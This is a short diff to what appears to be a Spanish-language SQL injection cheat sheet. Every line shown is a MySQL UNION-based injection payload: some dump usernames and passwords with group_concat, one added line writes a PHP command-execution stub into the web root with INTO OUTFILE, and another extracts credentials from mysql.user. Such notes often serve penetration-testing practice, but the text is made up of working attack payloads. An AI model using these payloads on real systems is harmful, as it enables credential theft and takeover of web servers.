@@ -75,6 +75,10 @@ select username from users union select group_concat(username,0x3A,password); # 
 
 select * from users union select NULL,NULL,NULL,group_concat(username,0x3a,password) from practiqueSql.users; # Muestra el contenido de una tabla dada de una base de datos dada.
 
+select * from users union select NULL,NULL,"<?php system('whoami');?>",NULL into outfile "/var/www/html" # Escribir un texto en un archivo.
+
+select * from users union select NULL,NULL,group_concat(User,0x3a,Password) from mysql.user-- - #Enumera las credenciales
+
 ```
 
 
